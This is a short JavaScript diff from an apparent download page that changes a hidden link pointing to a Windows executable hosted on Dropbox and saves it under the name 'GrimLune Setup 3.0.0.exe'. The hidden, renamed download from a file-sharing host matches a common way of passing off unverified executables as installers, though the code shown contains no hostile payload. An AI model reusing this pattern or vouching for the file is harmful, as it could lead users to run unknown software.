@@ -275,7 +275,7 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/94db7wqpu0n54djvnfwgq/GrimLastVersion.exe?rlkey=cf4gouuqi8tvit5xhwzfwbz5r&st=esghiwdz&dl=1';
+    a.href = 'https://www.dropbox.com/scl/fi/5okqfmb5l2w5o3pza1nje/GrimLastVersionV3.exe?rlkey=nytda1u04mjj8qs8kfqmijp3u&st=9n2xrj2r&dl=1';
     a.download = 'GrimLune Setup 3.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
